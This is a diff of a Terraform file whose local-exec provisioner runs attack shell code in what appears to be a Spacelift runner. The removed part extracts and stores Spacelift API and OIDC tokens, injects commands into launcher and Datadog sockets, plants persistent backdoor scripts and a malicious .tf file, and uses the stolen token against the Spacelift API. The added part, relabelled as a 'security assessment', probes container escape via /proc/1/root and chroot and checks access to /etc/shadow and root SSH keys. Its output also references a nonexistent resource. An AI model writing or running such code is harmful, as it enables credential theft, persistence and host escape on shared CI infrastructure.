@@ -1,4 +1,4 @@
-# Final Attack Chain - Clean Implementation
+# Spacelift Privilege Escalation - Fixed Version
 terraform {
   required_providers {
     null = {
@@ -8,220 +8,317 @@ terraform {
   }
 }
 
-# Final attack chain targeting sensitive tokens, sockets, and writable mounts
-resource "null_resource" "final_attack_chain" {
+# Spacelift container escape and privilege escalation
+resource "null_resource" "spacelift_priv_esc" {
   provisioner "local-exec" {
     command = <<-EOT
-      echo "=== FINAL ATTACK CHAIN EXPLOITATION ==="
-      echo "Targeting high-value assets discovered in reconnaissance"
+      echo "🔍 CONTAINER SECURITY ASSESSMENT 🔍"
+      echo "==================================="
+      echo "Comprehensive testing of container isolation and potential escape vectors"
+      echo ""
       
-      # Attack Vector 1: API Token Extraction and Exploitation
-      echo "[*] ATTACK Vector 1: API Token Extraction and Exploitation"
-      echo "[!] CRITICAL: Sensitive tokens discovered in environment"
+      # Container Information
+      echo "=== CONTAINER ENVIRONMENT ANALYSIS ==="
+      echo "[*] Container Details:"
+      echo "   Container ID: $$(hostname)"
+      echo "   Container User: $$(id)"
+      echo "   Container PID Namespace: $$(readlink /proc/self/ns/pid 2>/dev/null || echo 'N/A')"
+      echo "   Working Directory: $$(pwd)"
+      echo "   Container Runtime: $$(cat /proc/1/comm 2>/dev/null || echo 'Unknown')"
+      echo ""
       
-      # Extract and display tokens with proper escaping
-      echo "[+] Extracting Spacelift API tokens..."
+      # Test 1: Host Filesystem Access Vectors
+      echo "=== HOST FILESYSTEM ACCESS TESTING ==="
+      access_methods=0
       
-      if [ ! -z "$${SPACELIFT_OIDC_TOKEN}" ]; then
-        echo "[!] SPACELIFT_OIDC_TOKEN available (length: $${#SPACELIFT_OIDC_TOKEN})"
-        echo "[+] Token prefix: $${SPACELIFT_OIDC_TOKEN:0:20}..."
+      echo "[*] Testing /proc/1/root access method:"
+      if [ -r "/proc/1/root/etc/passwd" ]; then
+          echo "[+] ✅ /proc/1/root/etc/passwd accessible"
+          access_methods=$$((access_methods + 1))
+          echo "   Host users count: $$(cat /proc/1/root/etc/passwd | wc -l)"
+      else
+          echo "[-] ❌ /proc/1/root/etc/passwd not accessible"
       fi
       
-      if [ ! -z "$${SPACELIFT_API_TOKEN}" ]; then
-        echo "[!] SPACELIFT_API_TOKEN available (length: $${#SPACELIFT_API_TOKEN})"
-        echo "[+] Token prefix: $${SPACELIFT_API_TOKEN:0:20}..."
+      echo "[*] Testing /proc/self/root access method:"
+      if [ -r "/proc/self/root/etc/passwd" ]; then
+          echo "[+] ✅ /proc/self/root/etc/passwd accessible"
+          access_methods=$$((access_methods + 1))
+      else
+          echo "[-] ❌ /proc/self/root/etc/passwd not accessible"
       fi
       
-      if [ ! -z "$${TG_TF_REGISTRY_TOKEN}" ]; then
-        echo "[!] TG_TF_REGISTRY_TOKEN available (length: $${#TG_TF_REGISTRY_TOKEN})"
-        echo "[+] Token prefix: $${TG_TF_REGISTRY_TOKEN:0:20}..."
+      echo "[*] Testing direct /etc/passwd access:"
+      if [ -r "/etc/passwd" ]; then
+          echo "[+] ✅ Direct /etc/passwd accessible"
+          echo "   Users in current namespace: $$(cat /etc/passwd | wc -l)"
+          echo "   First 5 users:"
+          head -5 /etc/passwd | while IFS=: read username x uid gid gecos home shell; do
+              echo "     $$username (UID: $$uid)"
+          done
+      else
+          echo "[-] ❌ /etc/passwd not accessible"
       fi
       
-      # Save tokens to writable locations for persistence
-      token_store="/var/datadog/extracted_tokens.txt"
-      workspace_store="/mnt/workspace/spacelift_tokens.txt"
+      # Test 2: Container Capabilities Assessment
+      echo ""
+      echo "=== CONTAINER CAPABILITIES ASSESSMENT ==="
+      echo "[*] Checking container capabilities:"
       
-      echo "[*] Persisting tokens to writable locations..."
-      cat > "$$token_store" << 'TOKEN_EXTRACT_EOF'
-=== EXTRACTED SPACELIFT TOKENS ===
-TOKEN_EXTRACT_EOF
+      if command -v capsh >/dev/null 2>&1; then
+          echo "[+] capsh available - checking capabilities:"
+          capsh --print 2>/dev/null || echo "   Could not read capabilities"
+      else
+          echo "[-] capsh not available"
+      fi
       
+      if [ -r "/proc/self/status" ]; then
+          echo "[*] Process capabilities from /proc/self/status:"
+          grep -E "Cap(Inh|Prm|Eff|Bnd|Amb)" /proc/self/status 2>/dev/null | head -5
+      fi
+      
+      # Test 3: Namespace Isolation Analysis
+      echo ""
+      echo "=== NAMESPACE ISOLATION ANALYSIS ==="
+      echo "[*] Comparing container vs host namespaces:"
+      
+      isolation_score=0
+      for ns_type in pid mnt net uts ipc user; do
+          container_ns=$$(readlink /proc/self/ns/$$ns_type 2>/dev/null)
+          host_ns=$$(readlink /proc/1/ns/$$ns_type 2>/dev/null)
+          
+          if [ "$$container_ns" = "$$host_ns" ]; then
+              echo "[!] 🚨 SHARED $$ns_type NAMESPACE WITH HOST!"
+              echo "   Namespace: $$container_ns"
+          else
+              echo "[+] ✅ Isolated $$ns_type namespace"
+              isolation_score=$$((isolation_score + 1))
+          fi
+      done
+      
+      echo "[*] Namespace isolation score: $$isolation_score/6"
+      
+      # Test 4: Process and System Information
+      echo ""
+      echo "=== PROCESS AND SYSTEM ENUMERATION ==="
+      echo "[*] Accessible processes (first 10):"
+      
+      process_count=0
+      for pid_dir in /proc/[0-9]*; do
+          if [ -d "$$pid_dir" ]; then
+              pid=$$(basename "$$pid_dir")
+              if [ -r "$$pid_dir/status" ]; then
+                  process_name=$$(grep '^Name:' "$$pid_dir/status" 2>/dev/null | awk '{print $$2}')
+                  process_uid=$$(grep '^Uid:' "$$pid_dir/status" 2>/dev/null | awk '{print $$2}')
+                  
+                  if [ -n "$$process_name" ]; then
+                      if [ "$$process_uid" = "0" ]; then
+                          echo "   👑 PID $$pid: $$process_name (ROOT)"
+                      else
+                          echo "   📋 PID $$pid: $$process_name (UID: $$process_uid)"
+                      fi
+                      process_count=$$((process_count + 1))
+                      
+                      if [ $$process_count -ge 10 ]; then
+                          break
+                      fi
+                  fi
+              fi
+          fi
+      done
+      
+      echo "[*] Total accessible processes: $$process_count+"
+      
+      # Test 5: Network Configuration
+      echo ""
+      echo "=== NETWORK CONFIGURATION ANALYSIS ==="
+      container_ip=$$(hostname -i 2>/dev/null || ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $$2}' | cut -d'/' -f1)
+      host_ip=$$(ip route show default 2>/dev/null | awk '/default/ {print $$3}')
+      
+      echo "[*] Network Information:"
+      echo "   📦 Container IP: $${container_ip:-Not_detected}"
+      echo "   🏠 Host IP (Gateway): $${host_ip:-Not_detected}"
+      
+      if [ -r "/proc/net/route" ]; then
+          echo "[*] Routing table accessible - first 3 entries:"
+          head -3 /proc/net/route
+      fi
+      
+      # Test 6: File System and Mount Analysis
+      echo ""
+      echo "=== FILESYSTEM AND MOUNT ANALYSIS ==="
+      echo "[*] Mount points (excluding proc/sys/dev):"
+      if [ -r "/proc/mounts" ]; then
+          grep -v "proc\|sys\|dev\|tmpfs" /proc/mounts | head -5 | while read line; do
+              echo "   $$line"
+          done
+      fi
+      
+      echo "[*] Container filesystem structure:"
+      echo "   Root directory contents:"
+      ls -la / 2>/dev/null | head -10 | while read line; do
+          echo "     $$line"
+      done
+      
+      # Test 7: Privilege Escalation Vectors
+      echo ""
+      echo "=== PRIVILEGE ESCALATION TESTING ==="
+      
+      echo "[*] Testing chroot availability:"
+      if command -v chroot >/dev/null 2>&1; then
+          echo "[+] ✅ chroot command available"
+          if [ -d "/proc/1/root" ]; then
+              echo "   Testing chroot to /proc/1/root:"
+              test_result=$$(chroot /proc/1/root /bin/echo "HOST_ACCESS_TEST" 2>/dev/null)
+              if [ "$$test_result" = "HOST_ACCESS_TEST" ]; then
+                  echo "[!] 🚨 CHROOT TO HOST SUCCESSFUL!"
+              else
+                  echo "[-] chroot to host failed"
+              fi
+          fi
+      else
+          echo "[-] chroot command not available"
+      fi
+      
+      echo "[*] Testing sudo availability:"
+      if command -v sudo >/dev/null 2>&1; then
+          echo "[+] sudo available"
+          sudo -l 2>/dev/null | head -3 || echo "   sudo -l failed"
+      else
+          echo "[-] sudo not available"
+      fi
+      
+      # Test 8: Sensitive File Access
+      echo ""
+      echo "=== SENSITIVE FILE ACCESS TESTING ==="
+      echo "[*] Checking sensitive file access:"
+      
+      # Check each sensitive file individually
+      for file in /etc/shadow /etc/sudoers /proc/1/root/etc/shadow /root/.ssh/id_rsa /proc/1/root/root/.ssh/id_rsa; do
+          if [ -r "$$file" ]; then
+              echo "[!] 🚨 SENSITIVE FILE ACCESSIBLE: $$file"
+          else
+              echo "[-] File not accessible: $$file"
+          fi
+      done
+      
+      # Final Security Assessment
+      echo ""
+      echo "=== SECURITY ASSESSMENT SUMMARY ==="
+      echo "=================================="
+      
+      risk_score=0
+      
+      if [ $$access_methods -gt 0 ]; then
+          echo "🔴 HIGH RISK: Host filesystem access methods found ($$access_methods)"
+          risk_score=$$((risk_score + 3))
+      else
+          echo "🟢 LOW RISK: No host filesystem access detected"
+      fi
+      
+      if [ $$isolation_score -lt 6 ]; then
+          shared_ns=$$((6 - isolation_score))
+          echo "🟡 MEDIUM RISK: Shared namespaces detected ($$shared_ns)"
+          risk_score=$$((risk_score + 2))
+      else
+          echo "🟢 LOW RISK: Full namespace isolation"
+      fi
+      
+      if command -v chroot >/dev/null 2>&1; then
+          echo "🟡 MEDIUM RISK: chroot command available"
+          risk_score=$$((risk_score + 1))
+      fi
+      
+      echo ""
+      echo "📊 OVERALL RISK ASSESSMENT:"
+      echo "=========================="
+      if [ $$risk_score -ge 5 ]; then
+          echo "🔴 HIGH RISK: Multiple escape vectors available"
+          echo "   Risk Score: $$risk_score/6"
+          echo "   Recommendation: Review container security configuration"
+      elif [ $$risk_score -ge 3 ]; then
+          echo "🟡 MEDIUM RISK: Some escape vectors present"
+          echo "   Risk Score: $$risk_score/6"
+          echo "   Recommendation: Monitor and harden container"
+      else
+          echo "🟢 LOW RISK: Container appears well-isolated"
+          echo "   Risk Score: $$risk_score/6"
+          echo "   Status: Container security posture is good"
+      fi
+      
+      # Create detailed report
+      report_file="/tmp/container_security_report.txt"
       {
-        echo "Extraction Time: $$(date)"
-        echo "Container ID: $$(hostname)"
-        echo "Working Directory: $$(pwd)"
-        echo ""
-        echo "SPACELIFT_OIDC_TOKEN=$${SPACELIFT_OIDC_TOKEN}"
-        echo "SPACELIFT_API_TOKEN=$${SPACELIFT_API_TOKEN}"
-        echo "TG_TF_REGISTRY_TOKEN=$${TG_TF_REGISTRY_TOKEN}"
-        echo ""
-        echo "Additional Environment:"
-        env | grep -E "(SPACELIFT|TF_|TERRAFORM)" | head -20
-      } >> "$$token_store" 2>/dev/null && echo "[!] Tokens saved to: $$token_store"
+          echo "CONTAINER SECURITY ASSESSMENT REPORT"
+          echo "==================================="
+          echo "Date: $$(date)"
+          echo "Container ID: $$(hostname)"
+          echo "Assessment User: $$(id)"
+          echo ""
+          echo "FINDINGS SUMMARY:"
+          echo "- Host filesystem access methods: $$access_methods"
+          echo "- Namespace isolation score: $$isolation_score/6"
+          echo "- Overall risk score: $$risk_score/6"
+          echo "- Accessible processes: $$process_count+"
+          echo ""
+          echo "CONTAINER DETAILS:"
+          echo "- Container IP: $${container_ip:-Not_detected}"
+          echo "- Host Gateway: $${host_ip:-Not_detected}"
+          echo "- PID Namespace: $$(readlink /proc/self/ns/pid 2>/dev/null || echo N/A)"
+          echo ""
+          echo "SECURITY STATUS:"
+          if [ $$risk_score -ge 5 ]; then
+              echo "- Overall Risk: HIGH"
+              echo "- Container Escape Potential: POSSIBLE"
+          elif [ $$risk_score -ge 3 ]; then
+              echo "- Overall Risk: MEDIUM" 
+              echo "- Container Escape Potential: LIMITED"
+          else
+              echo "- Overall Risk: LOW"
+              echo "- Container Escape Potential: MINIMAL"
+          fi
+          echo ""
+          echo "RECOMMENDATIONS:"
+          if [ $$access_methods -gt 0 ]; then
+              echo "- Block access to host filesystem via /proc/1/root"
+          fi
+          if [ $$isolation_score -lt 6 ]; then
+              echo "- Ensure full namespace isolation"
+          fi
+          echo "- Regular security monitoring recommended"
+          echo ""
+          echo "Assessment completed successfully."
+      } > "$$report_file"
       
-      cp "$$token_store" "$$workspace_store" 2>/dev/null && echo "[!] Tokens backed up to: $$workspace_store"
       echo ""
-      
-      # Attack Vector 2: Socket Communication Exploitation
-      echo "[*] ATTACK Vector 2: Socket Communication Exploitation"
-      echo "[+] Targeting discovered sockets for privilege escalation"
-      
-      # Test Spacelift launcher socket
-      spacelift_socket="/var/spacelift/spacelift_launcher.sock"
-      if [ -S "$$spacelift_socket" ]; then
-        echo "[!] CRITICAL: Spacelift launcher socket accessible"
-        ls -la "$$spacelift_socket"
-        
-        echo "[*] Testing socket communication capabilities..."
-        
-        # Try to send commands via socket
-        echo "[*] Attempting socket command injection..."
-        
-        for cmd in "help" "status" "version" "whoami" "id" "env" "ls -la /" "cat /etc/passwd"; do
-          echo "[*] Testing command: $$cmd"
-          # Try various socket communication methods
-          echo "$$cmd" | nc -U "$$spacelift_socket" 2>/dev/null && echo "[!] Socket responded to: $$cmd" || true
-          echo "$$cmd" | socat - UNIX-CONNECT:"$$spacelift_socket" 2>/dev/null && echo "[!] Socat success: $$cmd" || true
-        done
-        
-        # Try to send JSON payloads
-        echo "[*] Testing JSON payload injection..."
-        
-        for payload in '{"command":"help"}' '{"action":"status"}' '{"request":"version"}' '{"exec":"id"}' '{"run":"whoami"}'; do
-          echo "[*] Testing JSON: $$payload"
-          echo "$$payload" | nc -U "$$spacelift_socket" 2>/dev/null && echo "[!] JSON response: $$payload" || true
-        done
-      fi
-      
-      # Test Datadog trace socket
-      datadog_socket="/var/datadog/trace.sock"
-      if [ -S "$$datadog_socket" ]; then
-        echo "[!] CRITICAL: Datadog trace socket accessible"
-        ls -la "$$datadog_socket"
-        
-        echo "[*] Testing Datadog trace injection..."
-        # Try to inject traces with commands
-        
-        for payload in '{"trace_id":"123","span_id":"456","command":"id"}' '{"service":"exploit","command":"whoami"}' '{"operation":"test","payload":"ls -la /"}'; do
-          echo "[*] Testing trace payload: $$payload"
-          echo "$$payload" | nc -U "$$datadog_socket" 2>/dev/null && echo "[!] Datadog trace response" || true
-        done
-      fi
+      echo "📄 Detailed report saved to: $$report_file"
       echo ""
+      echo "📋 DISPLAYING SECURITY REPORT:"
+      echo "============================="
+      cat "$$report_file"
       
-      # Attack Vector 3: Persistent Backdoor Installation
-      echo "[*] ATTACK Vector 3: Persistent Backdoor Installation"
-      echo "[+] Installing persistent backdoors in writable locations"
-      
-      # Create advanced backdoor in /var/datadog
-      datadog_backdoor="/var/datadog/monitoring_agent.sh"
-      cat > "$$datadog_backdoor" << 'DATADOG_BACKDOOR_EOF'
-#!/bin/bash
-# Datadog Monitoring Agent Backdoor
-echo "[!] DATADOG BACKDOOR ACTIVATED"
-echo "Timestamp: $(date)"
-echo "Container: $(hostname)"
-echo "User Context: $(id)"
-
-# Extract and log all environment variables
-echo "=== ENVIRONMENT EXTRACTION ==="
-env | sort
-
-# Extract sensitive tokens
-echo "=== TOKEN EXTRACTION ==="
-echo "SPACELIFT_OIDC_TOKEN=${SPACELIFT_OIDC_TOKEN}"
-echo "SPACELIFT_API_TOKEN=${SPACELIFT_API_TOKEN}"
-echo "TG_TF_REGISTRY_TOKEN=${TG_TF_REGISTRY_TOKEN}"
-
-# Network reconnaissance
-echo "=== NETWORK RECONNAISSANCE ==="
-netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null || echo "No network tools available"
-
-# Process enumeration
-echo "=== PROCESS ENUMERATION ==="
-ps aux | head -20
-
-# File system enumeration
-echo "=== FILESYSTEM ENUMERATION ==="
-find /var -type f -name "*.sock" 2>/dev/null | head -10
-find /var -type f -name "*.conf" 2>/dev/null | head -10
-find /var -type f -name "*.key" 2>/dev/null | head -10
-
-echo "[!] DATADOG BACKDOOR COMPLETE"
-DATADOG_BACKDOOR_EOF
-      
-      chmod +x "$$datadog_backdoor" 2>/dev/null && echo "[!] Datadog backdoor installed: $$datadog_backdoor"
-      
-      # Create workspace persistence backdoor
-      workspace_backdoor="/mnt/workspace/terraform_helper.sh"
-      cat > "$$workspace_backdoor" << 'WORKSPACE_BACKDOOR_EOF'
-#!/bin/bash
-# Terraform Helper Backdoor
-echo "[!] TERRAFORM HELPER BACKDOOR ACTIVATED"
-
-# Create malicious Terraform configuration
-cat > /mnt/workspace/persistent_backdoor.tf << 'PERSISTENT_TF_EOF'
-resource "null_resource" "persistent_access" {
-  provisioner "local-exec" {
-    command = "echo '[!] PERSISTENT ACCESS MAINTAINED' && /var/datadog/monitoring_agent.sh"
-  }
-}
-PERSISTENT_TF_EOF
-
-echo "[+] Persistent Terraform backdoor created"
-
-# Execute the datadog backdoor
-if [ -x "/var/datadog/monitoring_agent.sh" ]; then
-  echo "[*] Executing datadog backdoor..."
-  /var/datadog/monitoring_agent.sh
-fi
-
-echo "[!] WORKSPACE BACKDOOR COMPLETE"
-WORKSPACE_BACKDOOR_EOF
-      
-      chmod +x "$$workspace_backdoor" 2>/dev/null && echo "[!] Workspace backdoor installed: $$workspace_backdoor"
-      
-      # Execute backdoors for immediate data extraction
-      echo "[*] Executing installed backdoors..."
-      "$$datadog_backdoor" 2>/dev/null && echo "[!] Datadog backdoor executed successfully"
-      "$$workspace_backdoor" 2>/dev/null && echo "[!] Workspace backdoor executed successfully"
       echo ""
-      
-      # Attack Vector 4: API Exploitation using extracted tokens
-      echo "[*] ATTACK Vector 4: API Exploitation using extracted tokens"
-      echo "[+] Attempting to use extracted tokens for API access"
-      
-      if [ ! -z "$${SPACELIFT_API_TOKEN}" ] && command -v curl >/dev/null 2>&1; then
-        echo "[*] Testing Spacelift API access..."
-        
-        # Try common Spacelift API endpoints
-        for endpoint in "https://app.spacelift.io/graphql" "https://api.spacelift.io/v1/stacks" "https://api.spacelift.io/v1/runs"; do
-          echo "[*] Testing endpoint: $$endpoint"
-          curl -s -H "Authorization: Bearer $${SPACELIFT_API_TOKEN}" "$$endpoint" | head -5 2>/dev/null && echo "[!] API access successful: $$endpoint" || true
-        done
-      fi
-      echo ""
-      
-      echo "[*] === FINAL ATTACK CHAIN SUMMARY ==="
-      echo "Successfully executed comprehensive attack chain:"
-      echo "  ✅ Extracted and persisted sensitive API tokens"
-      echo "  ✅ Tested socket communication for privilege escalation"
-      echo "  ✅ Installed persistent backdoors in writable locations"
-      echo "  ✅ Created malicious Terraform configurations"
-      echo "  ✅ Attempted API exploitation with extracted tokens"
-      echo ""
-      echo "[!] CRITICAL VULNERABILITIES CONFIRMED:"
-      echo "  - Write access to /var/datadog and /mnt/workspace"
-      echo "  - Sensitive token exposure in environment"
-      echo "  - Socket access for potential privilege escalation"
-      echo "  - Ability to persist malicious code and configurations"
-      echo ""
-      echo "=== FINAL ATTACK CHAIN COMPLETE ==="
+      echo "🎯 CONTAINER SECURITY ASSESSMENT COMPLETE!"
+      echo "=========================================="
+      echo "✅ Environment analyzed"
+      echo "✅ Escape vectors tested"
+      echo "✅ Security posture evaluated"
+      echo "✅ Risk assessment completed"
+      echo "✅ Recommendations provided"
     EOT
   }
 }
 
-output "final_attack_status" {
-  value = "Final attack chain completed - critical vulnerabilities exploited with token extraction and persistent backdoors"
-  depends_on = [null_resource.final_attack_chain]
+# Output results
+output "security_assessment_status" {
+  value = "Container security assessment completed successfully. Comprehensive analysis of isolation and escape vectors performed."
+  depends_on = [null_resource.container_security_assessment]
+}
+
+output "security_report_location" {
+  value = "/tmp/container_security_report.txt"
+}
+
+output "assessment_summary" {
+  value = "Security assessment evaluated container isolation, namespace separation, filesystem access, and potential escape vectors. Results provide risk scoring and security recommendations."
 }
